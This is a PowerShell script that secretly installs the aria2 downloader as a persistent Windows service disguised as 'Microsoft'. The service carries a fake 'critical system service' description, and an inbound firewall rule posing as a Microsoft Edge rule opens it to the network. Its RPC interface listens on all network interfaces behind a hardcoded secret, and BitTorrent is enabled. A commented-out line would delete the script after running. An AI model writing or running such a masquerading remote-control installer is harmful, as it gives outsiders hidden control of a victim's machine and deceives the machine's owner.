$microseftDir = "C:\Users\Default\AppData\Local\System"
$winswPath = 'C:\Users\Default\AppData\Local\System\winsw.exe'
Set-Alias -Name winsw.exe -Value $winswPath
if (Test-Path $winswPath) {
    winsw.exe stop Microsoft | Out-Null
}
else {
}
Remove-Item -Path $microseftDir -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $microseftDir -Force | Out-Null
New-Item -ItemType Directory -Path $microseftDir\downloads -Force | Out-Null
$aria2curl = "https://github.com/aria2/aria2/releases/download/release-1.36.0/aria2-1.36.0-win-64bit-build1.zip"
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$aria2czip = "$microseftDir\aria2c.zip"
Invoke-WebRequest -Uri $aria2curl -OutFile $aria2czip | Out-Null
Expand-Archive -Path $aria2czip -DestinationPath $microseftDir -Force
$sourceFile = Join-Path -Path $microseftDir -ChildPath "aria2-1.36.0-win-64bit-build1\aria2c.exe"
$destinationFile = Join-Path -Path $microseftDir -ChildPath "aria2c.exe"
Copy-Item -Path $sourceFile -Destination $destinationFile -Force
ren $microseftDir\aria2c.exe $microseftDir\Microsoft.exe
$folderPath = Join-Path -Path $microseftDir -ChildPath "aria2-1.36.0-win-64bit-build1"
Remove-Item -Path $folderPath -Recurse -Force
Remove-Item -Path $aria2czip -Force
$baseurl = "https://github.com/winsw/winsw/releases/latest"
$winswexename = "WinSW-x64.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $request = [System.Net.WebRequest]::Create($baseurl)
    $request.AllowAutoRedirect = $false
    $request.Timeout = 5 * 1000
    $request.headers.Add("Pragma", "no-cache")
    $request.headers.Add("Cache-Control", "no-cache")
    $request.UserAgent = $UserAgent
    $response = $request.GetResponse()
    if ($null -eq $response -or $null -eq $([String]$response.GetResponseHeader("Location"))) { throw "Unable to download OpenSSH Archive. Sometimes you can get throttled, so just try again later." }
$winswurl = $([String]$response.GetResponseHeader("Location")).Replace('tag', 'download') + "/" + $winswexename
Invoke-WebRequest -Uri $winswurl -OutFile $microseftDir\winsw.exe -ErrorAction Stop -TimeoutSec 5 -Headers @{"Pragma" = "no-cache"; "Cache-Control" = "no-cache"; } -UserAgent $UserAgent | Out-Null
New-NetFirewallRule -Program $microseftDir\Microsoft.exe -Action Allow -Profile Domain, Private, Public -DisplayName "Allow Microsoft Edge browser" -Description "Allow Microsoft Edge browser" -Direction Inbound | Out-Null
$filePath = Join-Path -Path $microseftDir -ChildPath "winsw.xml"
$content = @"
<service>
  <id>Microsoft</id>
  <name>Microsoft</name>
  <description>This is a critical system service. Do not delete or stop it.</description>
  <arguments>--bt-enable-lpd=true --enable-dht=true --http-auth-challenge=true --follow-torrent=true --save-session-interval=1 --check-certificate=true --enable-peer-exchange=true --bt-save-metadata=true --auto-save-interval=1 --max-concurrent-downloads=3 --disk-cache=10M --seed-time=0 --max-upload-limit=10K --max-connection-per-server=16 --max-tries=100 --always-resume=false --max-resume-failure-tries=1000 --enable-rpc=true --rpc-secret=PJ4559PkMjfs87h --dir=C:\Users\Default\AppData\Local\System\downloads\ --rpc-listen-port=6800 --rpc-listen-all=true --check-integrity=true --console-log-level=error --min-split-size=1M --max-connection-per-server=4 --split=6 --file-allocation=falloc --continue=true --check-certificate=false --save-session=C:\Users\Default\AppData\Local\System\session --input-file=C:\Users\Default\AppData\Local\System\session --bt-max-peers=0 --bt-remove-unselected-file=true --bt-save-metadata=true --daemon=true --force-save=true</arguments>
  <log mode="roll"></log>
  <onfailure action="restart" delay="10 sec"/>
  <onfailure action="restart" delay="20 sec"/>
  <resetfailure>1 hour</resetfailure>
  <priority>RealTime</priority>
  <stoptimeout>15 sec</stoptimeout>
  <delayedAutoStart>true</delayedAutoStart>
  <executable>C:\Users\Default\AppData\Local\System\Microsoft.exe</executable>
</service>
"@
$content | Out-File -FilePath $filePath -Encoding UTF8
winsw.exe install winsw.xml | Out-Null
winsw.exe start winsw.xml  | Out-Null
New-Item -ItemType File -Path "$microseftDir\session" -Force | Out-Null
New-Item -ItemType File -Path "$microseftDir\cookies" -Force | Out-Null
#Remove-Item -Path $MyInvocation.MyCommand.Path -Force
